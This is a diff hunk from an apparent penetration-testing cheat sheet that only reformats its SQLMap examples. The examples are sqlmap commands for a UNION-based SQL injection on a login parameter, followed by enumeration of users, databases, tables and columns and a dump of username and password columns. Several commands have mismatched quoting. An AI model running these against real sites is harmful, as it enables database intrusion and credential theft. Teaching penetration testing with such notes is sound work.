@@ -709,15 +709,13 @@ SQLMap
 ``` console
 foobar@kali:~$ sqlmap -u http://site.com -p parameter [options]
 ```
-> examples: 
-> `sqlmap -u 'http://site.com/login.php?username=admin' -p username --technique=U` for a UNION based SQLi attack on the "admin" field in login.php.
-> `sqlmap -u `http://site.com/login.php?username=admin' -p username --technique U --users` for enumerating DB users
-> `sqlmap -u `http://site.com/login.php?username=admin' -p username --technique U --dbs` for enumerating the Databases
-> `sqlmap -u `http://site.com/login.php?username=admin' -p username --technique U -D [database] --tables` for enumerating tables in a DB
-> `sqlmap -u `http://site.com/login.php?username=admin' -p username --technique U --users -D [database] -T [table] --columns` to enumerate columns
-> `sqlmap -u `http://site.com/login.php?username=admin' -p username --technique U --users -D [database] -T [table] -C username,password --dump` to get a table view of contents of the username and password columns.
-
-
+> examples:   
+> `sqlmap -u 'http://site.com/login.php?username=admin' -p username --technique=U` for a UNION based SQLi attack on the "admin" field in login.php.  
+> `sqlmap -u `http://site.com/login.php?username=admin' -p username --technique U --users` for enumerating DB users  
+> `sqlmap -u `http://site.com/login.php?username=admin' -p username --technique U --dbs` for enumerating the Databases  
+> `sqlmap -u `http://site.com/login.php?username=admin' -p username --technique U -D [database] --tables` for enumerating tables in a DB  
+> `sqlmap -u `http://site.com/login.php?username=admin' -p username --technique U --users -D [database] -T [table] --columns` to enumerate columns  
+> `sqlmap -u `http://site.com/login.php?username=admin' -p username --technique U --users -D [database] -T [table] -C username,password --dump` to get a table view of contents of the username and password columns.  
 > https://github.com/sqlmapproject/sqlmap
 
 	
